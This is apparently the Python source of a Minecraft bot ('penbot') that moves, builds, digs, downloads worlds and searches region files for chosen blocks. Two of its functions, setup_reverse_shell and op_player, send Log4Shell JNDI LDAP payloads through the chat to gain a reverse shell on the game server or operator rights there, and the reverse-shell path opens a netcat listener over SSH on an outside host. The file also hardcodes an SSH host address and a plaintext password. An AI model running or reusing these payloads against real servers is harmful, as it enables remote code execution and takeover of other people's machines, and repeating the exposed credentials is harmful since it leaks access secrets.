import time
import json
import threading
import math
import os
import anvil
import pandas
import subprocess
from multiprocessing import Pool
from commands import WriteMessageCommand

from minecraft.networking.connection import Connection, PlayingReactor
from minecraft.networking.packets.serverbound.play import ChatPacket, ClientStatusPacket,  PositionAndLookPacket, UseItemPacket, PlayerBlockPlacementPacket
from minecraft.networking.packets.clientbound.play import ChatMessagePacket, PlayerPositionAndLookPacket, BlockChangePacket
from minecraft.networking.packets.clientbound.status import ResponsePacket, PingResponsePacket
from minecraft.networking.packets import Packet, PositionAndLookPacket, PlayerPositionAndLookPacket
from minecraft.networking.types import Position, VarInt, Boolean, Byte, BlockFace, Long, Float, RelativeHand, UnsignedByte

SSH_HOST = '172.104.234.197' # TODO make an encryption
SSH_PASSWORD = 'donteventhinkaboutit0321' # TODO make an encryption
SSH_DIR = "ssh_connection_and_listening"
EXPLOIT_LOG4J_DELAY = 3
APP_DIR = os.getcwd()
print(APP_DIR, "APP_DIR")
WORLD_HEIGHT = 30
CHUNKS_IN_REGION_LENGTHWISE = 32
BLOCKS_IN_CHUNK_LENGTHWISE = 16

#IMPORTANT: command parameters must have the same variable names throughout all the scripts (penbot.kv -> commands.py -> bot.py)

class KeepAliveClientboundPacket(Packet):                              #Probably not needed
    id = 0x1F
    packet_name = "Keep Alive Clientbound"
    definition = staticmethod(lambda context: [
        {'keep_alive_id': Long} if context.protocol_later_eq(339)
        else {'keep_alive_id': VarInt}
    ])

class KeepAliveServerboundPacket(Packet):                              #Probably not needed
    id = 0x10
    packet_name = "Keep Alive Serverbound"
    definition = staticmethod(lambda context: [
        {'keep_alive_id': Long} if context.protocol_later_eq(339)
        else {'keep_alive_id': VarInt}
    ])

class DigPacket(Packet):
    # INFO!     IF WE DONT USE get_id - bot gets kicked
    @staticmethod
    def get_id(context):
        return 0x1A if context.protocol_later_eq(757) else \
                0x08 if context.protocol_later_eq(550) else \
                    0x1A if context.protocol_later_eq(464) else \
                        0x18 if context.protocol_later_eq(389) else \
                            0x16 if context.protocol_later_eq(386) else \
                                0x13 if context.protocol_later_eq(343) else \
                                    0x14 if context.protocol_later_eq(332) else \
                                        0x14 if context.protocol_later_eq(318) else \
                                            0x13 if context.protocol_later_eq(80) else \
                                                0x11 if context.protocol_later_eq(77) else \
                                                    0x10 if context.protocol_later_eq(67) else \
                                                        0x1A

    packet_name = 'Player Digging'
    definition = [{'status': VarInt}, 
                {'location': Position}, 
                {'face': Byte}]

class Bot:
    CONNECTION_DELAY = 3
    RESPAWN_PERIOD = 5
    MOVE_DELAY = 0.1
    ONLINE_MODE = True
    def __init__(self, command_object): #TODO сделай инициализацию бота как отдельную комманду?
        #TODO сделай, чтобы можно было не вводить port, ибо на некоторые сервера оно не подключает с 25565
        self.USERNAME = command_object.username # Nickname string
        self.ip = command_object.ip # Server's ip
        self.port = command_object.port
        if command_object.port:
            self.port = int(command_object.port) # Server's port
        print(self.port)
        self.connect_localhost = command_object.connect_localhost # Used to determine if connecting to download_world server #TODO check if its needed at all
        if self.connect_localhost == True:
            self.ip = 'localhost'
            self.port = 25565

        # Optional properties
        # self.RESPAWN_PERIOD = command_object.respawn_period
        # self.MOVE_DELAY = command_object.move_delay      #TODO !!!!! ADD THEIR CUSTOMIZATION THROUGH APP !!!!
        # self.ONLINE_MODE = command_object.online_mode

        # Bot stats
        self.bot_pos = {
            'x': None,
            'feet_y': None,
            'z': None,
            'yaw': None,
            'pitch': None,
            }

        # Connecting bot to the server #TODO move to a separate func
        if self.port: self.connection = Connection(self.ip, self.port, username=self.USERNAME)
        else: self.connection = Connection(self.ip, username=self.USERNAME)
        time.sleep(self.CONNECTION_DELAY)
        self.connection.connect()

        # For respawning
        threading.Timer(self.RESPAWN_PERIOD, self.respawn).start()

        # Listenting for messages in chat
        @self.connection.listener(ChatMessagePacket)
        def get_msg(chat_packet):
            try:
                print(json.loads(chat_packet.json_data))
            except KeyError:
                print('WARNING: KeyError OCCURED!')

        # Getting the position of the client
        @self.connection.listener(PlayerPositionAndLookPacket)
        def get_pos(pos_look_packet):
            self.bot_pos['x'] = pos_look_packet.x
            self.bot_pos['feet_y'] = pos_look_packet.y
            self.bot_pos['z'] = pos_look_packet.z
            self.bot_pos['yaw'] = pos_look_packet.yaw
            self.bot_pos['pitch'] = pos_look_packet.pitch
            print('changed')

        @self.connection.listener(KeepAliveClientboundPacket)                                   #Probably not needed
        def respond_to_keep_alive_packet(keep_alive_clientbound_packet):
            print('client responding to a keep_alive_packet has began')
            self.respond_packet = KeepAliveServerboundPacket()
            self.respond_packet.keep_alive_id = keep_alive_clientbound_packet.keep_alive_id
            self.connection.write_packet(self.respond_packet)

    # Movement of the client
    def move(self, command_object):
        axis = command_object.axis
        steps = float(command_object.steps)
        try:
            if all(self.bot_pos.values()) and (axis=='x' or axis=='feet_y' or axis=='z'):
                self.bot_pos[axis] += steps
                pos_look_packet = PositionAndLookPacket(x=self.bot_pos['x'],
                                                            feet_y=self.bot_pos['feet_y'],
                                                            z=self.bot_pos['z'],
                                                            yaw=self.bot_pos['yaw'],
                                                            pitch=self.bot_pos['pitch'],
                                                            on_ground=True)
                self.connection.write_packet(pos_look_packet)
                time.sleep(self.MOVE_DELAY)
        except KeyError as e:
            print('WARNING: ', e)

    def write_message(self, command_object):
        message = command_object.message
        msg_packet = ChatPacket()
        msg_packet.message = str(message)
        self.connection.write_packet(msg_packet)

    # Respawning method
    def respawn(self):
        self.respawn_packet = ClientStatusPacket()
        self.respawn_packet.action_id = ClientStatusPacket().RESPAWN
        self.connection.write_packet(self.respawn_packet)
        threading.Timer(self.RESPAWN_PERIOD, self.respawn).start()

    # Block placing method
    def place_block(self, command_object):
        place_offset_x = int(command_object.place_offset_x) -1 #TODO why does -1 work (with top)?
        place_offset_y = int(command_object.place_offset_y)
        place_offset_z = int(command_object.place_offset_z)
        blockface_str = command_object.blockface_str
        inside_block = command_object.inside_block
        hand = command_object.hand
        try:
            self.place_block_packet = PlayerBlockPlacementPacket()

            self.place_block_packet.location = Position(
                x=int(self.bot_pos['x'])+place_offset_x,
                y=int(self.bot_pos['feet_y'])+place_offset_y,
                z=int(self.bot_pos['z'])+place_offset_z
                )
            if blockface_str.lower() == 'bottom': self.place_block_packet.face = self.place_block_packet.Face.BOTTOM
            elif blockface_str.lower() == 'top': self.place_block_packet.face = self.place_block_packet.Face.TOP
            elif blockface_str.lower() == 'north': self.place_block_packet.face = self.place_block_packet.Face.NORTH
            elif blockface_str.lower() == 'south': self.place_block_packet.face = self.place_block_packet.Face.SOUTH
            elif blockface_str.lower() == 'west': self.place_block_packet.face = self.place_block_packet.Face.WEST
            elif blockface_str.lower() == 'east': self.place_block_packet.face = self.place_block_packet.Face.EAST
            else: return False
            self.place_block_packet.inside_block = inside_block
            self.place_block_packet.hand = hand
            self.place_block_packet.x = 0.725
            self.place_block_packet.y = 0.125
            self.place_block_packet.z = 0.555
            # block data # WAIT does it matter at all??
            print(self.place_block_packet.location, "LOCATION")
            print(self.place_block_packet.face, "FACE")
            print(self.place_block_packet.inside_block, "inside_block")
            print(self.place_block_packet.hand, "hand")
            print(self.place_block_packet.x, "cursor_x")
            print(self.place_block_packet.y, "cursor_y")
            print(self.place_block_packet.z, "cursor_z")
            print(self.place_block_packet.id, "ID")
            self.connection.write_packet(self.place_block_packet)
            print("Place_block command has been executed, line 151, bot.py")

            return True

        except TypeError:
            print('PLAYER_BLOCKPLACE METHOD type error, line 165, bot.py')

    def dig_block(self, command_object):
        dig_offset_x = int(command_object.dig_offset_x) -1 #TODO why does -1 work?
        dig_offset_y = int(command_object.dig_offset_y)
        dig_offset_z = int(command_object.dig_offset_z)
        digging_time = float(command_object.dig_time)

        self.packet = DigPacket()

        self.packet.status = 0
        self.packet.location = Position(
                                        x=int(self.bot_pos['x'])+dig_offset_x,
                                        y=int(self.bot_pos['feet_y'])+dig_offset_y,
                                        z=int(self.bot_pos['z'])+dig_offset_z
                                        )
        self.packet.face = 0

        self.connection.write_packet(self.packet)

        time.sleep(digging_time)

        self.packet.status = 2

        self.connection.write_packet(self.packet)

    def use_current_item(self, command_object): # hand - "MAIN" or "OFF"
        hand = command_object.hand
        self.packet = UseItemPacket()

        if hand == "MAIN":
            self.packet.hand = self.packet.Hand.MAIN
        elif hand == "OFF":
            self.packet.hand = self.packet.Hand.OFF

        self.connection.write_packet(self.packet)

    def setup_reverse_shell(self, command_object): #Using LOG4J java vulnerability
        """LDAP server must be working on the host. HTTP server and compiling java must be working too"""
        """1389 port redirects to Reverse Shell malicious code"""
        """1390 port redirects to /op player malicious code"""
        """Setting a netcat listener for the reverse shell"""

        #https://www.youtube.com/watch?v=efnluUK_w_U     ---- VIDEO ON HOW TO SETUP SSH with the EXPLOIT

        os.chdir(SSH_DIR)

        rce_ssh_host = command_object.rce_ssh_host
        ssh_password = command_object.ssh_password
        # target_os = command_object.target_os #TODO add choosing linux or windows
        target_os = command_object.target_os
        ldap_port = 1389
        sh_listen_to_windows = "ssh_connect_and_listen_to_windows.sh"  # TODO Rename
        sh_listen_to_linux = "ssh_connect_and_listen_to_linux.sh"

        print("STARTING NETCAT LISTENER")
        if is_Linux():
            if target_os.lower() == "windows":
                os.system(f"gnome-terminal -x expect {sh_listen_to_windows} {rce_ssh_host} {ssh_password}")
            # elif target_os.lower() == "linux": #TODO add linux as target os: figure out why linux doesn't get redirected to http from ldap
            #    os.system(f"gnome-terminal -x expect {sh_listen_to_linux}")
        elif is_Windows():
            if target_os.lower() == "windows":
                replace_in_file("**ip**", rce_ssh_host, 'nc_listener_to_windows.txt') #Changing the ip parameter
                os.system(f"putty.exe -ssh root@{rce_ssh_host} -pw {ssh_password} -m nc_listener_to_windows.txt")
                replace_in_file(rce_ssh_host, "**ip**", 'nc_listener_to_windows.txt')#Changing the ip parameter back
            # elif target_os.lower() == "linux": #TODO add linux as target os: figure out why linux doesn't get redirected to http from ldap
            #    os.system(f"putty.exe -ssh root@{ssh_host} -pw {ssh_password} -m nc_listener_to_linux.txt")
        print("NETCAT LISTENER HAS BEEN SET")

        """Sending the attacking command to the server"""
        print(target_os)
        if target_os.lower() == "windows":
            attack_message = "${jndi:ldap://%s:%s/Log4jRCE}" % (rce_ssh_host, ldap_port)
        # elif target_os.lower() == "linux": #TODO add linux as target os: figure out why linux doesn't get redirected to http from ldap
        #    attack_message = "${jndi:ldap://%s:%s/Log4jRCE_of_linux}" % (ssh_host, ldap_port) #TODO start another ldap server with different port
        else:
            attack_message = "specify the os"
        time.sleep(EXPLOIT_LOG4J_DELAY)
        command = WriteMessageCommand(message=attack_message)
        self.write_message(command)

        os.chdir(APP_DIR)

    def op_player(self, command_object): #Using LOG4J java vulnerability
        """LDAP server must be working on the host. HTTP server and compiling java must be working too"""
        """1389 port redirects to Reverse Shell malicious code"""
        """1390 port redirects to /op player malicious code"""
        """Sending the attacking command to the server"""
        #INFO: Player name is already specified in the exploit
        op_ssh_host = command_object.op_ssh_host
        ldap_port = 1390
        attack_message = "${jndi:ldap://%s:%s/Log4jRCE}" % (op_ssh_host, ldap_port)
        time.sleep(EXPLOIT_LOG4J_DELAY)
        command = WriteMessageCommand(message=attack_message)
        self.write_message(command)

    def sleep(self, command_object): #TODO Rename to delay
        time.sleep(float(command_object.delay))

def start_download_server(): # TODO добавь проверку запущен ли уже сервер
    """Client must connect to it in order to start downloading. It's default address: localhost:25565"""
    wd = os.path.join(APP_DIR, 'download_world')
    os.chdir(wd) #TODO test downloading server and xray list on your world #TODO When refactoring, MAKE it change cwd with "with" statement(?????) OR java -jar {wd}/world-downloader.jar???
    print(os.getcwd(), "START DOWNLOAD")
    #TODO add if download_server is already running
    threading.Timer(0.5, os.system, [f'start world-downloader.exe']).start() #TODO use exe instead of jar
    time.sleep(2)
    os.chdir(APP_DIR)

def create_blocks_dataframe(command_object):
    """Creating Pandas file with all blocks and their coords"""
    file_name = command_object.file_name
    wd = command_object.wd #TODO if no wd was given, use download_world/world/region as default
    blocks_limit = int(command_object.blocks_limit)
    wanted_blocks = command_object.wanted_blocks.split(',')
    for i in range(len(wanted_blocks)):
        wanted_blocks[i] = wanted_blocks[i].strip()
    blocks_parsed = 0
    dataframe = pandas.DataFrame(columns=('Name', 'Id', 'Coordinates'))
    os.chdir(os.path.join(APP_DIR, wd)) #TODO When refactoring, MAKE it change cwd with "with" statement(?????)
    cwd = os.getcwd()
    for region_file in os.listdir(cwd):
        region = anvil.Region.from_file(region_file)
        chunks = get_range_of_chunks(region_file)
        print(region_file,chunks, "CHUNKS")
        for chunk_x in range(chunks['from'][0], chunks['to'][0]):
            for chunk_z in range(chunks['from'][1], chunks['to'][1]):
                try:
                    chunk = anvil.Chunk.from_region(region, chunk_x, chunk_z)
                except:
                    print("No such chunk!!!!, ln269, bot.py") #TODO FIX parsing unexisting chunks
                    continue
                for block_x in range(BLOCKS_IN_CHUNK_LENGTHWISE):
                    for block_y in range(WORLD_HEIGHT):
                        for block_z in range(BLOCKS_IN_CHUNK_LENGTHWISE):
                            block = chunk.get_block(block_x, block_y, block_z)
                            print("INFO: ", block, "BLOCK was Parsed")
                            block_coords = get_block_coords([chunk_x, chunk_z], [block_x, block_y, block_z])
                            if block.id in wanted_blocks:
                                dataframe = dataframe.append({"Name": block.id, "Id": "minecraft:" + block.id, #TODO use pandas.concat
                                                              "Coordinates": [block_coords['x'], block_coords['y'], block_coords['z']]},
                                                             ignore_index=True)
                            blocks_parsed += 1
                            if blocks_parsed == blocks_limit:
                                print(dataframe)
                                os.chdir(APP_DIR)
                                dataframe.to_csv(file_name)
                                return dataframe

def get_range_of_blocks(chunk_coords):
    """A chunk in Minecraft is a procedurally generated 16 x 16 segment of the world"""
    x = chunk_coords[0]
    z = chunk_coords[1]
    range_of_blocks = {
        'from': [x*16, 0, z*16],
        'to': [x*16+15, WORLD_HEIGHT-1, z*16+15], #TODO WE use WORLD_HEIGHT in range(), so we shouldn't set -1 to it, should we?
    }
    return range_of_blocks

def get_range_of_chunks(region_name):
    """
    Region files are 32x32 chunks or 512x512 blocks
    Region files have r.X.Z.mca format
    """
    x = int(region_name.split(".")[1])
    z = int(region_name.split(".")[2])
    range_of_chunks = {
        'from': [x*32, z*32],
        'to': [x*32+31, z*32+31],
    }
    return range_of_chunks

def get_block_coords(chunk_coords, relative_coords):
    """CHUNK HAS 16*16 blocks in it. Relative coords are coords within the chunk(values from 0 to 15)"""
    range_of_blocks = get_range_of_blocks(chunk_coords)
    block_coords = {
        'x': range_of_blocks["from"][0]+relative_coords[0],
        'y': relative_coords[1],
        'z': range_of_blocks['from'][2]+relative_coords[2],
    }
    return block_coords

def is_Windows():
    if os.name == 'nt':
        return True
    return False

def is_Linux():
    if os.name == 'posix':
        return True
    return False

def replace_in_file(value, new_value, file_name):
    # Read in the file
    with open(file_name, 'r') as file:
      filedata = file.read()

    # Replace the target string
    filedata = filedata.replace(value, new_value)

    # Write the file out again
    with open(file_name, 'w') as file:
      file.write(filedata)
